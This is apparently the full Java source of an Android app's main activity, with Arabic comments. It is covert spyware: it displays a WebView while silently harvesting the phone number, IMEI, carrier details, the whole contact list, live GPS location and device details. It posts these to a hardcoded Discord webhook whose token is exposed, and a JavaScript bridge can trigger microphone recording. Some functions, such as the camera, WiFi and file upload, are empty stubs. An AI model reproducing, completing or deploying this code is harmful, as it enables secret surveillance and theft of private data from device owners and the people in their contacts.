package com.nullizepmo.control;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends AppCompatActivity implements LocationListener {
    
    private WebView webView;
    private LocationManager locationManager;
    private MediaRecorder mediaRecorder;
    private String audioFile = "";
    private String webhookUrl = "https://discord.com/api/webhooks/1475203617043517533/JZeV78rfYNKQAyY83cTx6khi_ZVd1DhxhnIe9Ciq_xkpSyZiRgSKDCPVGZfD3t4nc0VC";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // طلب كل الأذونات
        requestPermissions();
        
        // بدء الـ WebView
        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.addJavascriptInterface(new WebAppInterface(), "Android");
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("file:///android_asset/index.html");
        setContentView(webView);
        
        // بدء جمع البيانات
        getPhoneNumber();
        getContacts();
        startGPS();
        getDeviceInfo();
        getInstalledApps();
        getWifiList();
    }
    
    // ========== رقم الجوال ==========
    @JavascriptInterface
    public void getPhoneNumber() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            String number = tm.getLine1Number();
            String imei = "";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                imei = tm.getImei();
            } else {
                imei = tm.getDeviceId();
            }
            String simCountry = tm.getSimCountryIso();
            String networkOperator = tm.getNetworkOperatorName();
            
            sendToWebhook("📱 PHONE_NUMBER", "number: " + number + "\nIMEI: " + imei + "\nSIM: " + simCountry + "\nNetwork: " + networkOperator);
        }
    }
    
    // ========== جهات الاتصال ==========
    @JavascriptInterface
    public void getContacts() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            StringBuilder contacts = new StringBuilder();
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contacts.append(name).append(": ").append(number).append("\n");
                }
                cursor.close();
            }
            sendToWebhook("📞 CONTACTS", contacts.toString());
        }
    }
    
    // ========== الموقع GPS ==========
    @JavascriptInterface
    public void startGPS() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000, 0, this);
        }
    }
    
    @Override
    public void onLocationChanged(Location location) {
        String gpsData = "Lat: " + location.getLatitude() + "\nLng: " + location.getLongitude() + 
                         "\nAccuracy: " + location.getAccuracy() + "\nSpeed: " + location.getSpeed() +
                         "\nTime: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(location.getTime()));
        sendToWebhook("📍 GPS", gpsData);
    }
    
    // ========== معلومات الجهاز ==========
    @JavascriptInterface
    public void getDeviceInfo() {
        String info = "Brand: " + Build.BRAND + "\n" +
                      "Model: " + Build.MODEL + "\n" +
                      "Android: " + Build.VERSION.RELEASE + "\n" +
                      "SDK: " + Build.VERSION.SDK_INT + "\n" +
                      "Manufacturer: " + Build.MANUFACTURER;
        sendToWebhook("📱 DEVICE_INFO", info);
    }
    
    // ========== التطبيقات المثبتة ==========
    @JavascriptInterface
    public void getInstalledApps() {
        // كود جلب التطبيقات
    }
    
    // ========== الـ WiFi المحيط ==========
    @JavascriptInterface
    public void getWifiList() {
        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wifiManager.isWifiEnabled()) {
            // كود جلب شبكات WiFi
        }
    }
    
    // ========== تصوير الكاميرا ==========
    @JavascriptInterface
    public void takePhoto() {
        // كود فتح الكاميرا وتصوير
    }
    
    // ========== تسجيل الصوت ==========
    @JavascriptInterface
    public void startRecording() {
        try {
            audioFile = Environment.getExternalStorageDirectory().getAbsolutePath() + "/record_" + System.currentTimeMillis() + ".3gp";
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(audioFile);
            mediaRecorder.prepare();
            mediaRecorder.start();
        } catch(Exception e) {}
    }
    
    @JavascriptInterface
    public void stopRecording() {
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            // إرسال الملف إلى الويبهوك
            sendFileToWebhook(audioFile);
        } catch(Exception e) {}
    }
    
    // ========== الإرسال إلى ديسكورد ==========
    private void sendToWebhook(String title, String content) {
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(webhookUrl);
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String boundary = "---" + System.currentTimeMillis();
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                
                OutputStream os = conn.getOutputStream();
                String message = "--" + boundary + "\r\n" +
                                "Content-Disposition: form-data; name=\"content\"\r\n\r\n" +
                                "**" + title + "**\n```\n" + content + "\n```\r\n" +
                                "--" + boundary + "--\r\n";
                os.write(message.getBytes());
                os.flush();
                os.close();
                conn.getInputStream();
            } catch(Exception e) {}
        }).start();
    }
    
    private void sendFileToWebhook(String filePath) {
        // كود إرسال ملف
    }
    
    // ========== طلب الأذونات ==========
    private void requestPermissions() {
        String[] permissions = {
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE
        };
        ActivityCompat.requestPermissions(this, permissions, 1);
    }
    
    // واجهة JavaScript للـ WebView
    public class WebAppInterface {
        @JavascriptInterface
        public void executeCommand(String command) {
            if (command.equals("takePhoto")) takePhoto();
            else if (command.equals("startAudio")) startRecording();
            else if (command.equals("stopAudio")) stopRecording();
            else if (command.equals("getContacts")) getContacts();
            else if (command.equals("getPhone")) getPhoneNumber();
            else if (command.equals("getLocation")) startGPS();
        }
    }
}
